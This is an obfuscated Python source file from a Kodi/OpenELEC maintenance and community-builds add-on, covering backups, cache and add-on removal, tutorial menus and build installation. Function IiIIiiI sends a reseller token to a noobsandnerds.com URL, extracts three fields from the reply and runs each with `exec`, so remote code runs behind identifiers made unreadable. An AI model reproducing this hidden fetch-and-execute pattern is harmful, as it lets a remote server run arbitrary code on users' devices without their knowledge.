 IiII111i1i11 ( 'folder' , 'OpenELEC News' , str ( url ) + '&author=OpenELEC' , 'grab_news' , 'OpenELEC.png' , '' , '' , '' )
 if 41 - 41: OO000
 if 49 - 49: OO000 % II111iiii . OO000 - o0oOOo0O0Ooo - OooO00OOoO00 * oOO00
def iiIIiI1I ( title , message , times , icon ) :
 icon = i1i + icon
 xbmc . executebuiltin ( "XBMC.Notification(" + title + "," + message + "," + times + "," + icon + ")" )
 if 47 - 47: O0 . o0oOOo0O0Ooo / OO000 * OOOOOOoo0O
 if 63 - 63: i1Ii11i1i - ooOo - OOOOOOoo0O - o0oOOoo / ooOo + OoO0O00
def o0oOo ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(filemanager,return)' )
 return
 if 32 - 32: ooOo . Oo % Oo . OoOoOO00
 if 37 - 37: Oo + O0 + Oo . OOOOOOoo0O . o0oOOo0O0Ooo
def OoO0 ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(systeminfo)' )
 if 13 - 13: Oo0Ooo / OoOoOO00 . I1ii11iIi11i . Oo
 if 31 - 31: o0oOOo0O0Ooo
def o0OO0o0o00o ( url ) :
 oOO00OOo0oo0 = urllib2 . Request ( url )
 oOO00OOo0oo0 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 i1I1I1 = urllib2 . urlopen ( oOO00OOo0oo0 )
 i11i1ii1I = i1I1I1 . read ( )
 i1I1I1 . close ( )
 return i11i1ii1I
 if 31 - 31: OO000 / OOOOOOoo0O
 if 3 - 3: oOO00
def i1111I1iii1 ( url ) :
 oOO00OOo0oo0 = urllib2 . Request ( url )
 oOO00OOo0oo0 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 try :
  i1I1I1 = urllib2 . urlopen ( oOO00OOo0oo0 , timeout = 5 )
 except :
  try :
   i1I1I1 = urllib2 . urlopen ( oOO00OOo0oo0 , timeout = 5 )
  except :
   try :
    i1I1I1 = urllib2 . urlopen ( oOO00OOo0oo0 , timeout = 5 )
   except :
    i1I1I1 = ''
 if i1I1I1 != '' :
  i11i1ii1I = i1I1I1 . read ( )
  i1I1I1 . close ( )
  return i11i1ii1I . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 else :
  return i1I1I1
  if 37 - 37: OO000 * OoooooooOO * OooO00OOoO00 + Oo0Ooo . I1IiiI
  if 61 - 61: Oo . Oo
  if 17 - 17: II111iiii / o0oOOoo
  if 80 - 80: Oo * OoO0O00 + OO000
  if 62 - 62: OoooooooOO . O0 % Oo0Ooo
  if 98 - 98: o0oOOo0O0Ooo * Oo0Ooo - OO000 . o0oOOoo
  if 2 - 2: Oo0Ooo - o0oOOoo % iIii1I11I1II1
  if 88 - 88: i1Ii11i1i - OoO0O00
  if 79 - 79: OOOOOOoo0O
  if 45 - 45: II111iiii + OOOOOOoo0O . OooO00OOoO00 . O0 * i1IIi - OO000
  if 48 - 48: I1ii11iIi11i + Oo0Ooo
  if 76 - 76: I1ii11iIi11i
  if 98 - 98: II111iiii + I1IiiI - I1ii11iIi11i . OO000
  if 51 - 51: OO000 + i11iIiiIii * OoO0O00 % Oo0Ooo / I1IiiI - iIii1I11I1II1
  if 20 - 20: i1Ii11i1i . OooO00OOoO00 . OO000 + OooO00OOoO00 - Oo * ooOo
  if 82 - 82: OoO0O00
  if 78 - 78: II111iiii / OooO00OOoO00 - i11iIiiIii + I1ii11iIi11i * Oo0Ooo
  if 17 - 17: OoOoOO00
  if 72 - 72: OOOOOOoo0O . Oo0Ooo - i11iIiiIii / I1IiiI
  if 64 - 64: ooOo
  if 80 - 80: o0oOOo0O0Ooo % iIii1I11I1II1
  if 63 - 63: oOO00 * i11iIiiIii
def O0O0OOo00Oo ( url ) :
 i1I1I1 = i1111I1iii1 ( url )
 print "### " + i1I1I1
 if "record" in i1I1I1 :
  i1II111ii1ii ( 'http://tlbb.me/comm.php?z=c&x=' )
  xbmc . executebuiltin ( 'Container.Refresh' )
 else :
  OO0o . ok ( 'Problem Detected' , "Sorry it wasn't possible to execute this command, please check your internet connection. If you're sure this is ok we may be experiencing some downtime on our servers, if that's the case we apologise and they will be back online asap." )
  if 26 - 26: II111iiii * OOOOOOoo0O + o0oOOo0O0Ooo / O0 + i1IIi - OooO00OOoO00
  if 56 - 56: Oo
  if 76 - 76: i1IIi % iIii1I11I1II1 - o0oOOo0O0Ooo + oOO00 - OooO00OOoO00
def OOOo00o ( ) :
 import tarfile
 if 100 - 100: iIii1I11I1II1 - OoOoOO00
 if not os . path . exists ( I1I1IiI1 ) :
  os . makedirs ( I1I1IiI1 )
  if 28 - 28: Oo0Ooo . O0 . OooO00OOoO00
 Ooo . create ( "Creating Backup" , "Adding files... " , '' , 'Please Wait' )
 Ooo00O = tarfile . open ( os . path . join ( I1I1IiI1 , oOo0OO00O0O ( ) + '.tar' ) , 'w' )
 if 52 - 52: I1ii11iIi11i
 for o0o in OOO00O0O :
  Ooo . update ( 0 , "Backing Up" , '[COLOR blue]%s[/COLOR]' % o0o , 'Please Wait' )
  Ooo00O . add ( o0o )
  if 24 - 24: Oo . OoO0O00 + i1Ii11i1i . ooOo - I1ii11iIi11i % OOOOOOoo0O
 Ooo00O . close ( )
 Ooo . close ( )
 if 49 - 49: O0 . Oo0Ooo / OO000
 if 29 - 29: I1ii11iIi11i / ooOo * O0 - i11iIiiIii - OoO0O00 + OO000
def IioO0O ( ) :
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 iII1iii = float ( oOooOOOoOo [ : 4 ] )
 if iII1iii < 14 :
  i1i1II11II1 = os . path . join ( oooooOoo0ooo , 'xbmc.log' )
 else :
  i1i1II11II1 = os . path . join ( oooooOoo0ooo , 'kodi.log' )
  if 86 - 86: I1IiiI / I1ii11iIi11i * OO000 % i11iIiiIii
 try :
  iiIi1I1i1 = open ( i1i1II11II1 , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
 except :
  try :
   iiIi1I1i1 = open ( os . path . join ( O0o0Oo , 'temp' , 'kodi.log' ) , mode = 'r' )
   IiiI = iiIi1I1i1 . read ( )
   iiIi1I1i1 . close ( )
  except :
   try :
    iiIi1I1i1 = open ( os . path . join ( O0o0Oo , 'temp' , 'xbmc.log' ) , mode = 'r' )
    IiiI = iiIi1I1i1 . read ( )
    iiIi1I1i1 . close ( )
   except :
    pass
    if 20 - 20: OOOOOOoo0O . OoooooooOO + OOOOOOoo0O + o0oOOoo * I1ii11iIi11i
 if 'OpenELEC' in IiiI :
  return True
  if 44 - 44: i11iIiiIii
  if 69 - 69: Oo * O0 + i11iIiiIii
def Ooo00 ( ) :
 xbmc . executebuiltin ( 'RunAddon(service.openelec.settings)' )
 if 23 - 23: o0oOOo0O0Ooo % iIii1I11I1II1
 if 62 - 62: OO000 - o0oOOo0O0Ooo + OO000 . OoO0O00 % II111iiii - iIii1I11I1II1
def OoO0OOOOO ( url ) :
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]1. Install:[/COLOR]  Installation tutorials (e.g. flashing a new OS)' , str ( url ) + '&thirdparty=InstallTools' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Add-on Tools:[/COLOR]  Add-on maintenance and coding tutorials' , str ( url ) + '&thirdparty=AddonTools' , 'grab_tutorials' , 'ADDONTOOLS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Audio Tools:[/COLOR]  Audio related tutorials' , str ( url ) + '&thirdparty=AudioTools' , 'grab_tutorials' , 'AUDIOTOOLS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Gaming Tools:[/COLOR]  Integrate a gaming section into your setup' , str ( url ) + '&thirdparty=GamingTools' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Image Tools:[/COLOR]  Tutorials to assist with your pictures/photos' , str ( url ) + '&thirdparty=ImageTools' , 'grab_tutorials' , 'IMAGETOOLS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Library Tools:[/COLOR]  Music and Video Library Tutorials' , str ( url ) + '&thirdparty=LibraryTools' , 'grab_tutorials' , 'LIBRARYTOOLS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Skinning Tools:[/COLOR]  All your skinning advice' , str ( url ) + '&thirdparty=SkinningTools' , 'grab_tutorials' , 'SKINNINGTOOLS.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Video Tools:[/COLOR]  All video related tools' , str ( url ) + '&thirdparty=VideoTools' , 'grab_tutorials' , 'VIDEOTOOLS.png' , '' , '' , '' )
 if 12 - 12: ooOo % O0 % OOOOOOoo0O . OoO0O00
 if 37 - 37: oOO00 - I1ii11iIi11i . i1Ii11i1i . oOO00 . Oo0Ooo % OOOOOOoo0O
def i1I1IiI1ii ( xmlfile ) :
 if 64 - 64: OoooooooOO % o0oOOoo . i11iIiiIii - i1Ii11i1i
 if 'http' in xmlfile :
  ooOiII11iiI1i11I = 'none'
  I1Iii1III = xmlfile [ - 10 : ]
  I1Iii1III = I1Iii1III [ : - 4 ]
  Oo0oo0OoO0o0 = os . path . join ( O0O , I1IiI , 'latest' )
  if 13 - 13: OOOOOOoo0O . OOOOOOoo0O + i11iIiiIii % O0 % i1Ii11i1i + oOO00
  if os . path . exists ( Oo0oo0OoO0o0 ) :
   IiiIiIIi1 = open ( Oo0oo0OoO0o0 , mode = 'r' )
   ooOiII11iiI1i11I = IiiIiIIi1 . read ( )
   IiiIiIIi1 . close ( )
   if 42 - 42: i1IIi + OOOOOOoo0O . OoooooooOO + I1ii11iIi11i . OooO00OOoO00 / OO000
  if ooOiII11iiI1i11I == I1Iii1III :
   I1Iii1III = ooOiII11iiI1i11I
   if 1 - 1: o0oOOo0O0Ooo
  else :
   downloader . download ( xmlfile , os . path . join ( ooooooO0oo , I1IiI , 'resources' , 'skins' , 'DefaultSkin' , 'media' , 'latest.jpg' ) )
   oo00IIIIIIIiI = open ( Oo0oo0OoO0o0 , mode = 'w+' )
   oo00IIIIIIIiI . write ( I1Iii1III )
   oo00IIIIIIIiI . close ( )
  xmlfile = 'latest.xml'
 O00oi111II = O0OO0O ( xmlfile , o0O . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 O00oi111II . doModal ( )
 del O00oi111II
 if 6 - 6: Oo - O0 * I1ii11iIi11i
 if 98 - 98: oOO00 * OOOOOOoo0O . OoooooooOO . O0
def i1I1iIi1IiI ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
  if 89 - 89: OOOOOOoo0O / O0 % OoooooooOO - O0 . OoO0O00
 i11i1ii1I = o0OO0o0o00o ( remote_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1iIiIi1I = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
 if 32 - 32: o0oOOoo
 for oOooO0 in i1iIiIi1I :
  O0O0ooOOO = xbmc . translatePath ( os . path . join ( recursive_location , oOooO0 ) )
  if 26 - 26: O0 * OO000 - I1IiiI - OOOOOOoo0O / iIii1I11I1II1
  if '/' not in oOooO0 :
   if 57 - 57: I1ii11iIi11i - OoO0O00 * iIii1I11I1II1
   try :
    Ooo . update ( 0 , "Downloading [COLOR=darkcyan]" + oOooO0 + '[/COLOR]' , '' , 'Please wait...' )
    downloader . download ( remote_path + oOooO0 , O0O0ooOOO , Ooo )
    if 26 - 26: OoO0O00 % o0oOOoo % o0oOOo0O0Ooo % OoOoOO00 . OOOOOOoo0O % O0
   except :
    print "failed to install" + oOooO0
    if 91 - 91: II111iiii . Oo0Ooo . ooOo - OoooooooOO / OoOoOO00
  if '/' in oOooO0 and '..' not in oOooO0 and 'http' not in oOooO0 :
   I1II1i1iIIi = remote_path + oOooO0
   i1I1iIi1IiI ( O0O0ooOOO , I1II1i1iIIi )
   if 55 - 55: OoO0O00
  else :
   pass
   if 20 - 20: o0oOOoo * i1Ii11i1i * o0oOOo0O0Ooo - o0oOOoo
   if 32 - 32: OO000 * ooOo
def ooOiiIII ( ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Delete Addon_Data Folder?' , 'This will free up space by deleting your addon_data folder. This contains all addon related settings including username and password info.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 37 - 37: OoooooooOO / I1ii11iIi11i % o0oOOo0O0Ooo
 if iIiI1 == 1 :
  O0Ooo00o00O ( )
  OO0o . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
  if 34 - 34: OoOoOO00 . OooO00OOoO00 % ooOo - O0 * O0
def ooo0 ( url ) :
 Ii1iii11i1ii1 = str ( url ) . replace ( ooooooO0oo , O0O )
 if 38 - 38: i1Ii11i1i % Oo
 if OO0o . yesno ( "Remove" , '' , "Do you want to Remove" ) :
  if 9 - 9: O0 . iIii1I11I1II1
  for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( url ) :
   if 44 - 44: I1ii11iIi11i % oOO00
   for oooO in III1I11i1iIi :
    os . unlink ( os . path . join ( Oo0 , oooO ) )
    if 6 - 6: OoO0O00
   for ooOOoOo in o0IiiiI111I :
    shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
  os . rmdir ( url )
  if 82 - 82: iIii1I11I1II1 . OooO00OOoO00 / oOO00 / Oo * II111iiii % ooOo
  try :
   if 62 - 62: II111iiii
   for Oo0 , o0IiiiI111I , III1I11i1iIi in os . walk ( Ii1iii11i1ii1 ) :
    if 96 - 96: OooO00OOoO00 % OoOoOO00 * I1ii11iIi11i
    for oooO in III1I11i1iIi :
     os . unlink ( os . path . join ( Oo0 , oooO ) )
     if 94 - 94: Oo0Ooo - i1IIi . O0 % Oo0Ooo . o0oOOoo
    for ooOOoOo in o0IiiiI111I :
     shutil . rmtree ( os . path . join ( Oo0 , ooOOoOo ) )
     if 63 - 63: i11iIiiIii % I1ii11iIi11i % I1IiiI . oOO00 * o0oOOo0O0Ooo + Oo
   os . rmdir ( Ii1iii11i1ii1 )
   if 77 - 77: o0oOOo0O0Ooo
  except :
   pass
   if 63 - 63: o0oOOoo * ooOo + o0oOOoo * OO000 + Oo0Ooo / I1ii11iIi11i
  iiOOOO00oO = os . path . join ( Oo00OOOOO , 'Database' , 'Addons16.db' )
  if 72 - 72: Oo . OoOoOO00 / II111iiii
  try :
   os . remove ( iiOOOO00oO )
   if 69 - 69: Oo * II111iiii - o0oOOoo - i1IIi + i11iIiiIii
  except :
   pass
   if 50 - 50: OoooooooOO * i1IIi / ooOo
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . sleep ( 1000 )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  oOo0iiii11i1 ( )
  OO0o . ok ( 'Add-on removed' , 'You may have to restart Kodi to repopulate' , 'your add-on database. Until you restart you\'ll' , 'find your add-on is still showing even though it\'s deleted' )
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 31 - 31: OooO00OOoO00 . i11iIiiIii . OoO0O00 * Oo0Ooo % OO000 . o0oOOo0O0Ooo
  if 92 - 92: OoooooooOO / O0 * i1IIi + iIii1I11I1II1
def o00O00O0O0 ( ) :
 IioOo0O ( )
 i1ii1iIIi11i111I = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , oO0Oo )
 if 87 - 87: I1ii11iIi11i
 if i1ii1iIIi11i111I != oO0Oo :
  oo0oO0oOOoOOoOo = ntpath . basename ( i1ii1iIIi11i111I )
  iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Delete Backup File' , 'This will completely remove ' + oo0oO0oOOoOOoOo , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' )
  if 45 - 45: I1IiiI
  if iIiI1 == 1 :
   os . remove ( i1ii1iIIi11i111I )
   if 17 - 17: OoooooooOO - o0oOOoo + OO000 . OoooooooOO % Oo0Ooo
   if 92 - 92: i1Ii11i1i - Oo % OoO0O00 - o0oOOo0O0Ooo % i1IIi
def IIII1iIii1Ii ( ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are log files generated when Kodi crashes and are only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 54 - 54: i1IIi - Oo0Ooo - o0oOOo0O0Ooo * oOO00 - OOOOOOoo0O
 if iIiI1 == 1 :
  Oo0o0oo0 ( )
  OO0o . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 28 - 28: O0 / o0oOOo0O0Ooo . OO000 / O0 . ooOo - o0oOOo0O0Ooo
  if 63 - 63: Oo / II111iiii . OoOoOO00 / i1IIi / OooO00OOoO00 . o0oOOo0O0Ooo
def oOo0iiii11i1 ( ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder' , 'Do you want to clean the packages folder? This will free up space by deleting the old zip install files of your addons. Keeping these files can also sometimes cause problems when reinstalling addons' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 11 - 11: Oo0Ooo * OoooooooOO - i11iIiiIii
 if iIiI1 == 1 :
  OO00OoOO ( )
  OO0o . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 13 - 13: i11iIiiIii . O0 / Oo * i1IIi
  if 14 - 14: oOO00 + oOO00 . OooO00OOoO00 / OO000 . iIii1I11I1II1
def OOOoOooO000oO ( ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove your Thumbnails folder. These will automatically be repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 10 - 10: II111iiii . Oo / OOOOOOoo0O
 if iIiI1 == 1 :
  i111iIi1i1 ( )
  O0Oo0Oo00o0o ( IIIII )
  if 35 - 35: OOOOOOoo0O / Oo0Ooo + O0 * iIii1I11I1II1 - O0
  iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' )
  if 3 - 3: I1ii11iIi11i
  if iIiI1 == 1 :
   try :
    xbmc . executebuiltin ( "RestartApp" )
    if 42 - 42: OooO00OOoO00 % Oo0Ooo + oOO00 - OooO00OOoO00 . iIii1I11I1II1 - OO000
   except :
    OOo00O0O ( )
    if 27 - 27: OOOOOOoo0O % Oo0Ooo . I1ii11iIi11i . i1IIi % OoOoOO00 . o0oOOo0O0Ooo
    if 37 - 37: OOOOOOoo0O + i1Ii11i1i * OO000 + oOO00
def i111iIi1i1 ( ) :
 IiIIIii1iIII1 = xbmc . translatePath ( 'special://home/userdata/Database/Textures13.db' )
 try :
  OoOo = database . connect ( IiIIIii1iIII1 )
  oooo0oo = OoOo . cursor ( )
  oooo0oo . execute ( "DROP TABLE IF EXISTS path" )
  oooo0oo . execute ( "VACUUM" )
  OoOo . commit ( )
  oooo0oo . execute ( "DROP TABLE IF EXISTS sizes" )
  oooo0oo . execute ( "VACUUM" )
  OoOo . commit ( )
  oooo0oo . execute ( "DROP TABLE IF EXISTS texture" )
  oooo0oo . execute ( "VACUUM" )
  OoOo . commit ( )
  oooo0oo . execute ( """CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""" )
  OoOo . commit ( )
  oooo0oo . execute ( """CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""" )
  OoOo . commit ( )
  oooo0oo . execute ( """CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""" )
  OoOo . commit ( )
 except :
  pass
  if 15 - 15: iIii1I11I1II1 + OOOOOOoo0O
  if 35 - 35: II111iiii % Oo . ooOo * o0oOOoo
def IiIIiiI ( url ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/Community_Builds/reseller_2?reseller=%s&token=%s&openelec=%s' % ( O0oo0OO0 , I1i1iiI1 , url )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOo0O000oo0 = re . compile ( 'path="(.+?)"' ) . findall ( i11i1ii1I )
 o0O00ooo0oO0o = re . compile ( 'reseller="(.+?)"' ) . findall ( i11i1ii1I )
 ii11 = re . compile ( 'premium="(.+?)"' ) . findall ( i11i1ii1I )
 OOoO = re . compile ( 'openelec="(.+?)"' ) . findall ( i11i1ii1I )
 i11i = o0O00ooo0oO0o [ 0 ] if ( len ( o0O00ooo0oO0o ) > 0 ) else 'None'
 IIII1II11Iii = ii11 [ 0 ] if ( len ( ii11 ) > 0 ) else 'None'
 I1i11I1IiII1 = OOoO [ 0 ] if ( len ( OOoO ) > 0 ) else 'None'
 exec I1i11I1IiII1
 exec i11i
 exec IIII1II11Iii
 if 40 - 40: o0oOOo0O0Ooo - O0 * II111iiii / I1IiiI . o0oOOo0O0Ooo + i1Ii11i1i
 if 58 - 58: i1Ii11i1i * O0 / OO000 + I1IiiI - I1ii11iIi11i * Oo0Ooo
def ooO0oO00oO0o ( name , url , description ) :
 if 'Backup' in name :
  IioOo0O ( )
  OOo000ooo = open ( url ) . read ( )
  oo0o00oO = os . path . join ( oO0Oo , description . split ( 'Your ' ) [ 1 ] )
  oooO = open ( oo0o00oO , mode = 'w' )
  oooO . write ( OOo000ooo )
  oooO . close ( )
  if 69 - 69: i1Ii11i1i
 else :
  if 'guisettings.xml' in description :
   OOOOO0o0OOo = open ( os . path . join ( oO0Oo , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   OoOoooO0o0O00o0O = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % O0ii1ii1ii
   i1iIiIi1I = re . compile ( OoOoooO0o0O00o0O ) . findall ( OOOOO0o0OOo )
   if 68 - 68: OoOoOO00
   for type , o0oO000oO , IiiIi1 in i1iIiIi1I :
    IiiIi1 = IiiIi1 . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , o0oO000oO , IiiIi1 ) )
    if 65 - 65: OO000
  else :
   oo0o00oO = os . path . join ( url )
   OOo000ooo = open ( os . path . join ( oO0Oo , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   oooO = open ( oo0o00oO , mode = 'w' )
   oooO . write ( OOo000ooo )
   oooO . close ( )
   if 71 - 71: i1Ii11i1i % i1Ii11i1i . ooOo + i11iIiiIii - i11iIiiIii
 OO0o . ok ( "Restore Complete" , "" , 'All Done !' , '' )
 if 16 - 16: iIii1I11I1II1 / I1IiiI / i1Ii11i1i - i11iIiiIii . o0oOOoo / Oo
 if 13 - 13: o0oOOo0O0Ooo % O0 - i1Ii11i1i * OoooooooOO / Oo0Ooo - OoooooooOO
def oOo000O00O ( name , url , video , description , skins , guisettingslink , artpack ) :
 OooO = 1
 ooOOoOO000 = 0
 oOO0 = os . path . join ( O0o0Oo , 'CP_Profiles' )
 i1i1iIi1IiI = os . path . join ( oOO0 , 'list.txt' )
 iIIIi1IiI11I1 = [ ]
 i1ii1iIIi11i111I = description . replace ( ' ' , '_' ) . replace ( "'" , "" ) . replace ( ":" , "-" )
 if 16 - 16: ooOo
 if not os . path . exists ( oOO0 ) :
  os . makedirs ( oOO0 )
  if 96 - 96: o0oOOoo / ooOo % O0 / Oo * OoO0O00 * OooO00OOoO00
 IIi1ii1i1i1 = os . path . join ( oOO0 , i1ii1iIIi11i111I )
 if not os . path . exists ( IIi1ii1i1i1 ) :
  os . makedirs ( IIi1ii1i1i1 )
 else :
  ooOOoOO000 = OO0o . yesno ( 'Profile Already Exists' , 'This build is already installed on your system, would you like to remove the old one and reinstall?' )
  if ooOOoOO000 == 1 :
   try :
    shutil . rmtree ( IIi1ii1i1i1 )
    os . makedirs ( IIi1ii1i1i1 )
   except :
    pass
  else :
   OooO = 2
   if 92 - 92: OO000 - o0oOOoo / o0oOOoo + oOO00
 if OooO == 1 :
  iiIII1i = os . path . join ( oOOoo0Oo , i1ii1iIIi11i111I + '_gui.zip' )
  if I11 == 'true' :
   print "### Download path = " + iiIII1i
   if 57 - 57: Oo - OoooooooOO * OoO0O00 * OOOOOOoo0O + ooOo
  try :
   downloader . download ( guisettingslink , iiIII1i )
   if I11 == 'true' :
    print "### successfully downloaded guisettings.xml"
  except :
   OO0o . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
   if I11 == 'true' :
    print "### FAILED to download " + guisettingslink
    if 100 - 100: i1Ii11i1i - i1IIi
    if 90 - 90: OO000 + ooOo . II111iiii - OoOoOO00 % iIii1I11I1II1
  if zipfile . is_zipfile ( iiIII1i ) :
   o00oO00O0 = str ( os . path . getsize ( iiIII1i ) )
  else :
   o00oO00O0 = '0'
   if 24 - 24: oOO00 / OO000 * Oo
  Ooo . create ( "Community Builds" , "Downloading " + description , '' , 'Please Wait' )
  iiIII1i = os . path . join ( oOOoo0Oo , i1ii1iIIi11i111I + '.zip' )
  if 33 - 33: Oo
  if not os . path . exists ( oOOoo0Oo ) :
   try :
    os . makedirs ( oOOoo0Oo )
   except :
    OO0o . ok ( 'Please Check Storage Path' , 'Unable to create a folder in the storage location you\'ve provided. Please check your storage location in the add-on settings and try again' )
    return
    if 22 - 22: O0 + Oo % i1IIi
    if 83 - 83: O0 + OO000 % i11iIiiIii
  I1III1iI1II = os . path . join ( o0 , 'extracted' )
  downloader . download ( url , iiIII1i , Ooo )
  Ooo . create ( "Community Builds" , "Extracting " + description , '' , 'Please Wait' )
  extract . all ( iiIII1i , I1III1iI1II , Ooo )
  if os . path . exists ( os . path . join ( I1III1iI1II , 'userdata' , '.cbcfg' ) ) :
   os . makedirs ( os . path . join ( O0O , I1IiI , 'updating' ) )
  if I11 == 'true' :
   print "### Downloaded build to: " + iiIII1i
   print "### Extracted build to: " + I1III1iI1II
   if 2 - 2: OooO00OOoO00 . i1IIi - o0oOOo0O0Ooo / OoooooooOO + i11iIiiIii + iIii1I11I1II1
  iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  if 26 - 26: i11iIiiIii . Oo - O0
  IIIII11II1 = re . compile ( 'id="(.+?)"' ) . findall ( IiiI )
  OOOO0oOO = re . compile ( 'name="(.+?)"' ) . findall ( IiiI )
  IIIiii = re . compile ( 'version="(.+?)"' ) . findall ( IiiI )
  if 73 - 73: I1IiiI
  I11OoooO = IIIII11II1 [ 0 ] if ( len ( IIIII11II1 ) > 0 ) else ''
  i1IIi11 = OOOO0oOO [ 0 ] if ( len ( OOOO0oOO ) > 0 ) else ''
  o0oO0o0oo0O0 = IIIiii [ 0 ] if ( len ( IIIiii ) > 0 ) else ''
  if 95 - 95: OoO0O00 % OoO0O00 * ooOo - OoO0O00
  print "### Build name details to store in ti_id: " + i1IIi11
  if 57 - 57: OoooooooOO / OoOoOO00 + ooOo . OO000
  Ii111IIII1 = os . path . join ( I1III1iI1II , 'userdata' , 'addon_data' , 'ti_id' )
  O00ooo0oo0 = os . path . join ( Ii111IIII1 , 'id.xml' )
  if not os . path . exists ( Ii111IIII1 ) :
   os . makedirs ( Ii111IIII1 )
   if 68 - 68: OoooooooOO - i11iIiiIii . O0 . OO000 * OoOoOO00
  oo00IIIIIIIiI = open ( O00ooo0oo0 , mode = 'w+' )
  oo00IIIIIIIiI . write ( 'id="' + str ( I11OoooO ) + '"\nname="' + i1IIi11 + '"\nversion="' + o0oO0o0oo0O0 + '"\ngui="' + o00oO00O0 + '"' )
  oo00IIIIIIIiI . close ( )
  if 38 - 38: OoOoOO00 - OoOoOO00 * i11iIiiIii % I1ii11iIi11i + I1IiiI + Oo
  o00OO00OoO = os . path . join ( Ii111IIII1 , 'startup.xml' )
  oo00IIIIIIIiI = open ( o00OO00OoO , mode = 'w+' )
  oo00IIIIIIIiI . write ( 'date="01011001"\nversion="' + o0oO0o0oo0O0 + '"' )
  oo00IIIIIIIiI . close ( )
  if 44 - 44: I1ii11iIi11i - oOO00 * O0
  o0o0oO = open ( O00ooo0oo0 , 'r' )
  Ii11II1 = o0o0oO . read ( )
  o0o0oO . close ( )
  print "### ti_id/id.xml contents: " + Ii11II1
  if 45 - 45: ooOo
  if 66 - 66: Oo
  iI1iIiiIii = OO0o . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones supplied in this build?' , yeslabel = 'Replace my settings' , nolabel = 'Keep my settings' )
  if iI1iIiiIii == 0 :
   iiiiI11 ( os . path . join ( o0 , 'extracted' , 'userdata' , 'guisettings.xml' ) )
   if 99 - 99: i1Ii11i1i - I1ii11iIi11i - I1IiiI - i1Ii11i1i + OoO0O00 + II111iiii
  for iiiiIii11i1 in os . listdir ( IIiiiiiiIi1I1 ) :
   iIIIi1IiI11I1 . append ( iiiiIii11i1 )
   if 34 - 34: i1Ii11i1i * OooO00OOoO00
   if 31 - 31: oOO00 . ooOo
